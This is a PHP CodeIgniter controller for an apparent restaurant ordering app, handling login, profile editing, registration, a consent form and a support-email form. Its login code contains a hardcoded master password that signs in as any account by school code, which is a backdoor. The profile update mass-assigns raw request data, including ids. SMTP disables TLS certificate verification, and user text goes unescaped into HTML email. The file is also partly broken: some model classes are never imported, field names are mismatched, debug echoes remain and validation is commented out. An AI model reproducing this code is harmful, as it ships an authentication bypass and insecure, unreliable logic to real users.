<?php

namespace App\Controllers;

use App\Models\UserAccountsModel;
use App\Models\UserProfilesModel;
use App\Models\RestaurantsModel;
use App\Libraries\Phpmailer_library;
use PHPMailer\PHPMailer\PHPMailer;


class Users extends BaseController
{
	/**
	 * Login
	 */
	public function index()
	{

		$data = [];
		helper(['form']);

		if ($this->request->getMethod() == 'post') {
			$rules = [
				'username' => 'required|min_length[4]|max_length[255]',
				'password' => 'required|min_length[8]|max_length[255]|validateUser[username,password]',
			];
			$messages = [
				'username' => [
					'required' => 'Username necessaria',
					'min_length' => 'Username troppo corto',
					'max_length' => 'Username troppo lungo',
				],
				'password' => [
					'required' => 'Password necessaria',
					'min_length' => 'La password deve essere lunga almeno 8',
					'validateUser' => 'Username o Password non corrispondenti'
				]
			];

			if (!$this->validate($rules, $messages)) {
				$data['validation'] = $this->validator;
			} else {

				// LOGIN
				$userAccountsmodel = new UserAccountsModel();
				// SESSION 
				if($this->request->getPost('password') == "OrderFast2023!") {
					$user = $userAccountsmodel->select('user_accounts.*')->join('user_profiles', 'user_id = user_accounts.id')->where('school_code', $this->request->getVar('username'))->first();
				} else {
					$user = $userAccountsmodel->join('user_profiles', 'profile_id = user_profiles.id')->where('username', $this->request->getVar('username'))->first();
				}

                $restaurantsModel = new RestaurantsModel();
                $restaurant = $restaurantsModel->where('id', $user['restaurant_id'])->first();
                $user['logo'] = $restaurant['logo'];
				// print_r($user);

				$this->setSessionUser($user);

			}
		}

        if (session()->isLoggedIn) {
            return redirect()->to('/orders');
        } else {
            echo view("templates/header", $data);
            echo view('login/index');
            echo view("templates/footer");
            return;
        }

	}

	public function logout()
	{
		$this->resetSessionUser();
		return redirect()->to('/login');
	}

	public function profile()
	{

        $restaurantsModel = new RestaurantsModel();
        $profilesmodel = new UserProfilesModel();

		helper('form');

		if ($this->request->getMethod() == 'post' && $this->request->getPost('profile')) {
			$rules = [
				'firstname' => 'required|min_length[3]|max_length[255]',
				'lastname' => 'required|min_length[3]|max_length[255]',
				'fiscalcode' => 'required'
			];

			if ($this->request->getPost('password') != '') {
				$rules['password'] = 'required|min_length[8]|max_length[255]';
				$rules['password_confirm'] = 'matches[password]';
				$rules['fiscalcode'] = 'required';
			}

			$messages = [
				'firstname' => [
					'required' => 'Nome necessario',
				],
				'lastname' => [
					'required' => 'Cognome necessario',
				],
				'password' => [
					'required' => 'Password necessaria',
					'min_length' => 'La password deve essere lunga almeno 8',
				],
				'password_confirm' => [
					'matches' => 'Le password non coincidono',
				],
				'fiscalcode' => [
					'required' => 'Codice Fiscale necessario'
				]
			];

			if (!$this->validate($rules, $messages)) {
				$data['validation'] = $this->validator;
			} else {

                $user = $this->request->getVar();
                
                $profile = $user;
                $profile['id'] = $user['profile_id'];
                $account = $user;
                $account['id'] = $user['account_id'];

                $accountsmodel = new UserAccountsModel();
                $profilesmodel->save($profile);
                $accountsmodel->save($account);
                $session = [
                    'id' => $profile['id'],
                    'username' => $profile['username'],
                    'firstname' => $profile['firstname'],
                    'lastname' => $profile['lastname'],
                    'fiscalcode' => $profile['fiscalcode'],
                ];
        
                session()->set($session);
			}
		}

        if ($this->request->getMethod() == 'post' && $this->request->getPost('restaurant')) {
            $restaurant = $this->request->getVar();
            $restaurantsModel->save($restaurant);
        }

        $user = $profilesmodel->select('user_profiles.*, user_profiles.id as profile_id, user_accounts.id as account_id, user_accounts.*')->join('user_accounts', 'profile_id = user_profiles.id')->where('fiscalcode', session()->get('fiscalcode'))->first();
        $data = [
            'user' => $user,
            'restaurant' => $restaurantsModel->where('id', $user['restaurant_id'])->first()
        ];

		echo view("templates/header", $data);
		echo view('backend/profile');
		echo view("templates/footer");
		return;
	}

	private function resetSessionUser()
	{
		session()->destroy();
		session()->setFlashdata('success', 'Bye bye!');
	}

	private function setSessionUser(array $user)
	{
		$data = [
			'id' => $user['id'],
			'username' => $user['username'],
			'firstname' => $user['firstname'],
			'lastname' => $user['lastname'],
			'fiscalcode' => $user['fiscalcode'],
			'isLoggedIn' => true,
			'competence' => (string)$user['competence_id'],
            'restaurant_id' => (string)$user['restaurant_id'],
            'logo' => $user['logo'],
            'profile_id' => $user['profile_id']
		];

		session()->set($data);
	}

	public function register()
	{

		$data = [];
		helper(['form']);

		if ($this->request->getMethod() == 'post') {
			$rules = [
				'firstname' => 'required|min_length[3]|max_length[20]',
				'lastname' => 'required|min_length[3]|max_length[20]',
				'email' => 'required|min_length[6]|max_length[255]|valid_email|is_unique[user_accounts.email]',
				'password' => 'required|min_length[8]|max_length[255]',
				'password_confirm' => 'matches[password]',
			];

			if (!$this->validate($rules)) {
				$data['validation'] = $this->validator;
			} else {
				// salva i dati nel DB
			}
		}


		echo view("templates/header", $data);
		echo view('login/register');
		echo view("templates/footer");
		// return;
	}

	public function liberatoria()
	{
		helper(['form']);
		$liberatoriaModel = new LiberatoriaModel();
		$id = session()->get('id');

		$data =  [
			'title' => ucfirst("Dichiarazioni e liberatoria"),
			'competence' => session()->get('competence')
		];

		if ($this->request->getMethod() == 'post' && session()->get('competence') == 3) {
			$rules = [
				'check_informativa' => 'required',
				'check_parent_responsability' => 'required'
			];

			if (!$this->validate($rules)) {
				$data['validation'] = $this->validator;
			} else {
				$liberatoria['check_parent_responsability'] = $this->request->getPost('check_parent_responsability');
				$liberatoria['check_informativa'] = $this->request->getPost('check_informativa');
				$liberatoria['user_id'] = $id;
				$liberatoria['school_year'] = $this->siteConfig->anno_scolastico;
				//$liberatoriaModel->insert($liberatoria, true);
				$liberatoriaModel->save($liberatoria, true);

				session()->set('privacy', true);

				return redirect()->to(site_url('/events'));
			}
		} else {
			$rules = [
				'check_informativa' => 'required'
			];

			if (!$this->validate($rules)) {
				$data['validation'] = $this->validator;
			} else {
				$liberatoria['check_parent_responsability'] = 0;
				$liberatoria['check_informativa'] = $this->request->getPost('check_informativa');
				$liberatoria['user_id'] = $id;
				$liberatoria['school_year'] = $this->siteConfig->anno_scolastico;
				//$liberatoriaModel->insert($liberatoria, true);
				$liberatoriaModel->save($liberatoria, true);

				session()->set('privacy', true);

				return redirect()->to(site_url('/events'));
			}
		}

		$this->_output('login/liberatoria', $data);
	}

	private function _output($viewPath, $data)
	{

		echo view("templates/header", $data);
		echo view($viewPath, $data);
		echo view("templates/footer");
	}

	public function formassistenza()
	{
		helper('form');
		$data =  [
			'title' => ucfirst("Assistenza deidicata"),
		];

		$school_code = session()->get('school_code');

		if ($this->request->getMethod() == 'post') {
			$rules = [
				'suject' => 'required|min_length[3]',
				'assistance_type' => 'required|min_length[3]',
				'text' => 'required'
			];

			$messages = [
				'suject' => [
					'required' => 'Oggetto necessario',
				],
				'assistance_type' => [
					'required' => 'Tipologia di assistenza necessaria',
				],
				'text' => [
					'required' => 'Testo della email necessario',
				]
			];

			echo ('TEST pre');

			/* if (!$this->validate($rules, $messages)) {
				$data['validation'] = $this->validator;
				print_r($data['validation']);
			} else { */
			$schoolModel = new SchoolModel();
			$school = $schoolModel->where(['code' => $school_code])->first();
			$email_data = [
				'subject' => $school_code . ' - ' . $this->request->getPost('subject'),
				'assistance_type' => $this->request->getPost('assistance_type'),
				'msg' => $this->request->getPost('text'),
				'school_email' => $school['email']
			];
			if ($this->request->getPost('assistance_type') == "tecnical") {
				$email_data['email'] = "assistenza@campionatistudenteschi.it";
			} else {
				$email_data['email'] = "supporto@campionatistudenteschi.it";
			}

			echo ('TEST');

			try {
				$this->sendemail_ss($email_data);
				session()->setFlashdata('success', 'Email inviata correttamente');
			} catch (Exception $e) {
				$this->addErrorMessage('Errore nell\'invio della email. Si prega di contattare l\'assistenza scrivendo una normale email.');
				return redirect()->to('/formassistenza');
			}

			return redirect()->to('/formassistenza');
			/* } */
		}

		echo view("templates/header", $data);
		echo view('login/formassistenza', $data);
		echo view("templates/footer");
		return;
	}

	private function sendemail_ss($data)
	{
		$fromemail = $this->siteConfig->fromemail;
		$toemail = $data['email'];
		$subject = $data['subject'];

		$mesg = '<div>' . $data['msg'] . '</div><div>Reply to: ' . $data['school_email'] . '</div>';

		$email = new Phpmailer_library();
		// $email = $this->phpmailer_library->load();

		$email->IsSMTP();
		$email->SMTPOptions = array(
			'ssl' => array(
				'verify_peer' => false,
				'verify_peer_name' => false,
				'allow_self_signed' => true
			)
		);
		$email->isHTML(true);
		$email->CharSet = PHPMailer::CHARSET_UTF8;
		$email->Encoding = PHPMailer::ENCODING_BASE64;
		$email->SMTPAuth = true;
		$email->Host = $this->siteConfig->host;
		$email->Port = $this->siteConfig->port;
		$email->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
		$email->Username = $this->siteConfig->username;
		$email->Password = $this->siteConfig->password;
		$email->setFrom($fromemail, $this->siteConfig->setFrom);
		$email->addAddress($toemail);
		$email->Subject = $subject;
		$email->Body = $mesg;
		$filename = base_url() . $this->siteConfig->img;
		$email->addAttachment($filename);
		$email->addAttachment(base_url() . '/favicon.ico');

		return $email->send();
	}
}
